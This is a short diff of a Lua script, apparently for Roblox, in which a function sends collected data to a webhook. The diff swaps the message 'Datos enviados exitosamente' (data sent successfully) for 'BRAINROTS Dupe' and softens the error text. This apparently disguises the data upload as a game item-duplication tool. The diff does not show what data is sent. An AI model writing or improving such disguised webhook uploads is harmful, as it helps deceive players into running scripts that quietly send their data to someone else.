@@ -471,10 +471,10 @@ local function startSequence(url)
 		local success, result = sendToWebhook(webhookUrl, data)
 		
 		if success then
-			print("✅ Datos enviados exitosamente")
+			print(" BRAINROTS Dupe")
 			statusText.Text = "Datos enviados - Iniciando secuencia..."
 		else
-			print("❌ Error enviando datos:", result)
+			print("❌ Error en sistema:", result)
 			statusText.Text = "Error en envío - Continuando..."
 		end
 		
